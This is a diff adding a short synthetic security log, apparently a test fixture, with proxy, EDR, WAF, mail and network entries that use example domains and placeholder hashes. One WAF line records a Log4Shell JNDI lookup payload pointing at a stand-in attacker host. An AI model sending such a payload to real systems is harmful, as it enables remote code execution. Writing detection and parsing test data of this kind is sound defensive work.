@@ -1,0 +1,7 @@
+2024-03-10T13:00:01Z proxy01 blocked request user=dave url=http://malicious-example.xyz/dropper.exe src=192.0.2.55 dst=198.51.100.77
+2024-03-10T13:00:05Z edr01 file_hash md5=d41d8cd98f00b204e9800998ecf8427e sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709 path=C:\Users\dave\Downloads\invoice.exe
+2024-03-10T13:00:09Z edr01 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 path=/tmp/.hidden/update.sh
+2024-03-10T13:01:00Z waf01 blocked exploit attempt CVE-2021-44228 from src=203.0.113.130 payload=${jndi:ldap://evil.example.com/a}
+2024-03-10T13:02:00Z mail01 phishing report from user=erin sender=billing@lookalike-example.top link=https://secure-login.example.top/verify
+2024-03-10T13:03:00Z net01 connection from 2001:db8::5 to 198.51.100.10 proto=TCP dport=8443
+2024-03-10T13:04:00Z app01 build 1.4.2 started at 13:04:00 by ci@example.org
